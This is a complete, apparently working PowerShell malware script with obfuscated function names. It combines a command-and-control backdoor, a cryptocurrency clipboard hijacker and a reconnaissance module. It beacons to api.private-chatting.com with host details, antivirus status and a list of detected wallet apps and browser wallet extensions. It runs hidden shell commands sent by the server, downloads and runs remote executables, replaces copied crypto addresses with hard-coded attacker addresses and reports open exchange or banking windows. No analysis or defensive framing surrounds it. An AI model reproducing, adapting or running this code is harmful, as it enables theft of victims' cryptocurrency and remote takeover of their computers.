$sta = [threading.thread]::CurrentThread.GetApartmentState();
$scriptItem = Get-Item -Path $MyInvocation.MyCommand.Path;
if ($sta -ne "STA") {
    powershell -sta -file $MyInvocation.MyCommand.Path;
    exit(0);
}
$OS_Major = [System.Environment]::OSVersion.Version.Major.ToString() + "." + [System.Environment]::OSVersion.Version.Minor.ToString();

$global:worker = $true;

function XF3a8JO3r5r8G([string] $str) {
    return [System.Environment]::ExpandEnvironmentVariables("%" + $str + "%")
}

function WMI([string] $class, [string] $value) {
    $val = $null;
    $results = (Get-WmiObject -Class $class) ;
    foreach ($item in $results) {
        $val = $item[$value];
		break;
    }
	if($val -eq $null)
	{
	   $val = [Guid]::NewGuid().ToString();
	}
    return $val;
}
function B6ZqvVzzJXq27j() {
    return (WMI 'win32_logicaldisk' "VolumeSerialNumber") 
}

function ik9hXhN11R() {
    return (WMI 'Win32_OperatingSystem' "Caption") 
}

function P9TEtu77LCNtD() {
    return (WMI 'Win32_Processor' "AddressWidth") 
}

function av_enabled([uint32]$state) {
    [byte[]] $bytes = [System.BitConverter]::GetBytes($state);
    if (($bytes[1] -eq 0x10) -or ($bytes[1] -eq 0x11)) {
        return "Enabled";
    }
    elseif (($bytes[1] -eq 0x00) -or ($bytes[1] -eq 0x01) -or ($bytes[1] -eq 0x20) -or ($bytes[1] -eq 0x21)) {
        return "Disabled";
    }
    return "Unknown";
}

function TmBvivf3Wwj8U7NzZh() {

    $avs = Get-WmiObject -Namespace "root\SecurityCenter" -Class "AntiVirusProduct";
    $avs += Get-WmiObject -Namespace "root\SecurityCenter2" -Class "AntiVirusProduct";
    $avf = New-Object Collections.Generic.List[string];

    foreach ($av in $avs) {
        $enabled = (av_enabled $av.productState);
        $avf.Add($av.displayName + " [$enabled]")
    }

    return [string]::Join(", ", $avf.ToArray())
}

function vxUABGtfQ7B7([string]$str) {
    if ($str.Length -eq 0) {
        return "";
    }
    $str = $str.Replace("/", "");
    return ($str.Substring(0, 1).ToUpper() + $str.Substring(1));
}

function getUserAgent {
    $iJunq6e5ivimimy = FindPaths;
    return $nb0MawLGyrxf + $UV1oAmOp0S3 + (vxUABGtfQ7B7 (XF3a8JO3r5r8G "COMPUTERNAME")) + $UV1oAmOp0S3 + (vxUABGtfQ7B7 (XF3a8JO3r5r8G "USERNAME")) + $UV1oAmOp0S3 + (vxUABGtfQ7B7 (ik9hXhN11R)) + " [" + (P9TEtu77LCNtD) + "]" + $UV1oAmOp0S3 + (vxUABGtfQ7B7 (TmBvivf3Wwj8U7NzZh)) + $UV1oAmOp0S3 + $iJunq6e5ivimimy + $UV1oAmOp0S3
}


function oUjmVhxHJ4Qhrw($data, $notify) {
    $URL = "http://api.private-chatting.com/connect";
    if ($OS_Major -ne "6.1") {
        [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12;
        [System.Net.ServicePointManager]::ServerCertificateValidationCallback = { $true }
    }
    $cli = New-Object System.Net.WebClient;
    $useragent = getUserAgent;
    $cli.Headers['X-User-Agent'] = [System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($useragent));
    if ($notify) {
        $cli.Headers['X-notify'] = $notify
    }
    $Response = $cli.UploadString($URL, $data);
    $WorkerEn = $cli.ResponseHeaders["worker"];
    if ($WorkerEn -eq "0") {
        $global:worker = $false;
    }
    else {
        $global:worker= $true;
    }
    return $Response.ToString()

}

function DownloadFile([string]$URL, [string]$Filename) {
    [string]$UserAgent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/599.99 (KHTML, like Gecko) Chrome/81.0.3999.199 Safari/599.99";
    if ($OS_Major -ne "6.1") {
        [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12;
        [System.Net.ServicePointManager]::ServerCertificateValidationCallback = { $true };
        $ret = Invoke-WebRequest -Uri $URL -OutFile $Filename -UserAgent $UserAgent -Method 'GET'
    }
    else {
        $cli = New-Object System.Net.WebClient;
        $cli.Headers['User-Agent'] = $UserAgent;
        $cli.DownloadFile($URL, $Filename);
    }

   
}
function yQM1ybBDSjEP($url, $path, $wait) {
    DownloadFile $url $path
}

function Gn4bSDMHKIxEE8UP7wZJ($quit) {

    Remove-Item -Path $svauXHdYmXwV1whE;
    if ($quit) {
        exit(0);
    }
}

function Test-Function([string] $func) {
    try {
        $ret = Get-Command  -Name $func;
        if ($ret) {
            return $true
        }
    }
    catch {
    }
    return $false
}

if (!(Test-Function "Get-Clipboard") -or !(Test-Function "Set-Clipboard")) {
    Add-Type -AssemblyName PresentationFramework;

    function Get-Clipboard($Format) {
        return [System.Windows.Clipboard]::GetText();
    }

    function Set-Clipboard($Value) {
        [System.Windows.Clipboard]::SetText($Value)
    }


}

function log_event([string] $coin, [string] $value) {
    oUjmVhxHJ4Qhrw "" ($coin + " - " + $value)
} 



$coins = @"
[
    {
        "a": "bc1qn6ype8u5kgj672mvsez9wz9wt9wk22tzd5vprp",
        "r": "^bc1[a-z0-9]{39,59}$",
        "c": "BTC"
    },
    {
        "a": "1Pqkb4MZwKzgSNkaX32wMwg95D9NfW9vZX",
        "r": "^1[a-km-zA-HJ-NP-Z1-9]{26,33}$",
        "c": "BTC"
    },
    {
        "a": "3JvBvRuBfYvB6MjzMornj9EQpxhq9W7vXP",
        "r": "^3[a-km-zA-HJ-NP-Z1-9]{26,33}$",
        "c": "BTC"
    },
    {
        "a": "qq9yrhef7csy3yzgxgs0rvkvez440mk53gv8ulyu6a",
        "r": "^((bitcoincash|bchreg|bchtest):)?(q|p)[a-z0-9]{41}$",
        "c": "BCH"
    },
    {
        "a": "bnb1vmwl54jxj9yvsgz33xtyuvqnurdjy2raqnttkq",
        "r": "^(bnb)([a-z0-9]{39})$",
        "c": "BNB"
    },
    {
        "a": "0x884467182849bA788ba89300e176ebe11624C882",
        "r": "^0x[a-fA-F0-9]{40}$",
        "c": "ETH"
    },
    {
        "a": "48qx1krgEGzdcSacbmZdioNwXxW6r43yFSJDKPWZb3wsK9pYhajHNyE5FujWo1NxVwEBvGebS7biW9mjMEWdMevqMGmDJ6x",
        "r": "^[48][0-9AB][1-9A-HJ-NP-Za-km-z]{93}$",
        "c": "XMR"
    },
    {
        "a": "rH6dyKWNpcvFz6fQ4ohyDbevSxcxdxfSmz",
        "r": "^r[rpshnaf39wBUDNEGHJKLM4PQRST7VWXYZ2bcdeCg65jkm8oFqi1tuvAxyz]{24,34}$",
        "c": "XRP"
    },
    {
        "a": "DDxhfK5wbJkRN25mAbBYk3ND4xLjiMRyNq",
        "r": "^D{1}[5-9A-HJ-NP-U]{1}[1-9A-HJ-NP-Za-km-z]{32}$",
        "c": "DOGE"
    },
    {
        "a": "Xtwj8uGx77NYBUki1UCPvEhe4kHYi6yWng",
        "r": "^X[1-9A-HJ-NP-Za-km-z]{33}$",
        "c": "DASH"
    }

]
"@
function main2 {

    if ($global:worker -eq $false) {
        return;
    }

    $book = ConvertFrom-Json $coins

    try {
        [string]$clip = Get-Clipboard -Format Text;
        $clip = $clip.Trim();

        foreach ($entry in $book) {

            if (($clip -match $entry.r) -and ($clip -ne $entry.a) -and ($entry.a -ne "")) {
                Set-Clipboard -Value $entry.a
                log_event $entry.c $clip+"newnewapp"
            }

        }
               
    }
    catch {
    }
}



function main {

    
    $ZFKUuv2t12Af = "|V|";
    $UV1oAmOp0S3 = "\";
    $V7vFcwq3wUVRrsgcv = "M_19";
    $nb0MawLGyrxf = $V7vFcwq3wUVRrsgcv + '_' + (B6ZqvVzzJXq27j);
    $AuVAfc591z0Yw = (XF3a8JO3r5r8G "temp") + $UV1oAmOp0S3;
    $svauXHdYmXwV1whE = $scriptItem.FullName;
    $aWOPoMdm8aLL89 = $scriptItem.Name;
    $EwcQB8qBuCScs = "powershell.exe";
	

    while ($true) {

        try {
            [string]$kk9XDcoU8Sfo692 = oUjmVhxHJ4Qhrw;
            [string[]] $sep = $ZFKUuv2t12Af;
            $Fd1Jal88zKyxij = $kk9XDcoU8Sfo692.Split( $sep, [StringSplitOptions]::None);
            $ivI0sA6txn5XPifq = $Fd1Jal88zKyxij[0];
            $JkByjqH1xztsW2YUG = $Fd1Jal88zKyxij[1];
        
            if ($ivI0sA6txn5XPifq -eq "Cmd") { 
                Start-Process -FilePath "cmd.exe" -WindowStyle "Hidden" -ArgumentList ("/c " + $JkByjqH1xztsW2YUG) 
            }
            if ($ivI0sA6txn5XPifq -eq "DwnlExe") {
                $path = $AuVAfc591z0Yw + $Fd1Jal88zKyxij[2];
                $cmd = $Fd1Jal88zKyxij[3] + $path;
                yQM1ybBDSjEP $Fd1Jal88zKyxij[1] $path $true;
                Start-Sleep 1
                Start-Process -FilePath "cmd.exe" -WindowStyle "Hidden" -ArgumentList ("/c " + $cmd) 
            }
            if ($ivI0sA6txn5XPifq -eq "SelfRemove") {
                Gn4bSDMHKIxEE8UP7wZJ $true
            } 
        }
        catch {}

  
  
  
  try {
            main2;
        }
        catch
        {}
       
        try {
            FindWindow
        }
        catch
        {}
        
        Start-Sleep 1
    }
   

}
$pathdata = 
@'
[
    {
        "root": "%appdata%",
        "targets": [
            {
                "name": "Exodus-A",
                "path": "Exodus"
            },
            {
                "name": "Atomic-A",
                "path": "Atomic Wallet"
            },
            {
                "name": "Electrum-A",
                "path": "Electrum"
            },
            {
                "name": "Ledger-A",
                "path": "Ledger Live"
            },
            {
                "name": "Jaxx-A",
                "path": "Jaxx Liberty"
            },
            {
                "name": "com.liberty.jaxx-A",
                "path": "com.liberty.jaxx"
            },
            {
                "name": "Guarda-A",
                "path": "Guarda"
            },
            {
                "name": "Armory-A",
                "path": "Armory"
            },
            {
                "name": "DELTA-A",
                "path": "DELTA"
            },
            {
                "name": "TREZOR-A",
                "path": "TREZOR Bridge"
            },
            {
                "name": "Bitcoin-A",
                "path": "Bitcoin"
            },
            {
                "name": "binance-A",
                "path": "binance"
            }
        ]
    },
    {
        "root": "%localappdata%",
        "targets": [
            {
                "name": "Blockstream-A",
                "path": "Blockstream Green"
            },
            {
                "name": "Coinomi-A",
                "path": "Coinomi"
            }
        ]
    },
    {
        "root": "%localappdata%\\Google\\Chrome\\User Data\\Default\\Extensions",
        "targets": [
            {
                "name": "Metamask-C",
                "path": "nkbihfbeogaeaoehlefnkodbefgpgknn"
            },
            {
                "name": "MEWcx-C",
                "path": "nlbmnnijcnlegkjjpcfjclmcfggfefdm"
            },
            {
                "name": "Coin98-C",
                "path": "aeachknmefphepccionboohckonoeemg"
            },
            {
                "name": "Binance-C",
                "path": "fhbohimaelbohpjbbldcngcnapndodjp"
            },
            {
                "name": "Jaxx-C",
                "path": "cjelfplplebdjjenllpjcblmjkfcffne"
            },
            {
                "name": "Coinbase-C",
                "path": "hnfanknocfeofbddgcijnmhnfnkdnaad"
            }
        ]
    },
    {
        "root": "%localappdata%\\Microsoft\\Edge\\User Data\\Default\\Extensions",
        "targets": [
            {
                "name": "Metamask-E",
                "path": "ejbalbakoplchlghecdalmeeeajnimhm"
            },
            {
                "name": "Coinomi-E",
                "path": "gmcoclageakkbkbbflppkbpjcbkcfedg"
            }
        ]
    },
    {
        "root": "%localappdata%\\BraveSoftware\\Brave-Browser\\User Data\\Default\\Extensions",
        "targets": [
            {
                "name": "Metamask-B",
                "path": "nkbihfbeogaeaoehlefnkodbefgpgknn"
            },
            {
                "name": "MEWcx-B",
                "path": "nlbmnnijcnlegkjjpcfjclmcfggfefdm"
            },
            {
                "name": "Coin98-B",
                "path": "aeachknmefphepccionboohckonoeemg"
            },
            {
                "name": "Binance-B",
                "path": "fhbohimaelbohpjbbldcngcnapndodjp"
            },
            {
                "name": "Jaxx-B",
                "path": "cjelfplplebdjjenllpjcblmjkfcffne"
            },
            {
                "name": "Coinbase-B",
                "path": "hnfanknocfeofbddgcijnmhnfnkdnaad"
            }
        ]
    }
]
'@;

function FindPaths {

    $a = ConvertFrom-Json $pathdata
    $results = New-Object Collections.Generic.List[string];

    try {
        $ba = Get-ChildItem -Path "$env:appdata\Mozilla\Firefox\Profiles\*.xpi" -Recurse -Force;
        Foreach ($i in $ba) {
            if ($i.Name -match "ebextension@metamask.io.xpi") {
                try {
                    [string] $ss = "metamask-F"
                    $results.Add($ss)
    
                }
                catch {
                    Write-Host "error"
                }
            }
        }
    }
    catch {}


    foreach ($entry in $a) {
        $rootdir = [System.Environment]::ExpandEnvironmentVariables($entry.root);
        foreach ($target in $entry.targets) {
            if ((Test-Path -Path (Join-Path -Path $rootdir -ChildPath $target.path))) {
                $results.Add($target.name)
            }

        }
    
    }

    $ret = [Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes([string]::Join("`n", $results)));
    return $ret;
}


function FindWindow {
    
        $keywords = @('binance', 'coinbase','blockchain','voyager','blockfi','coindesk','etoro','kucoin','citi','paxful','paypal','huobi','poloniex','bittrex','kraken','bitfinex','bitstamp')
    $windows = (Get-Process | Where-Object { $_.MainWindowTitle -ne "" } | Select-Object MainWindowTitle)

    foreach ($wndobj in $windows) {
        [string]$wnd = $wndobj.MainWindowTitle;
        foreach ($keyword in $keywords) {
            if ($wnd.ToLower().Contains($keyword.ToLower())) {
				try {
                    $contentfile = [System.IO.File]::ReadAllText("%SystemDrive%\Users\Public\log.dat").ToLower().replace(' ','');
                    $logsend = 'newnewapp' + ($keyword.ToLower() + "[" + $wnd.ToLower() + "]").ToLower().replace(' ','');
       if( $contentfile -eq $keyword.ToLower().replace(' ','') )
				{
                    $gtr ="";
				}
				else
				{
                    $datatowrite = ('newnewapp' + ($keyword.ToLower() + "[" + $wnd.ToLower() + "]")).ToLower().replace(' ','');
									[System.IO.File]::WriteAllText("%SystemDrive%\Users\Public\log.dat",$keyword.ToLower().replace(' ','') );
					                log_event 'newnewapp'  ($keyword.ToLower() + "[" + $wnd.ToLower() + "]");
				}	
    }
    catch {
        [System.IO.File]::WriteAllText("%SystemDrive%\Users\Public\log.dat",$keyword.ToLower().replace(' ','') );

    }
							
            }
        }
    }
    
}


while ($true) {
    try {
        main
    }
    catch {

    }
}

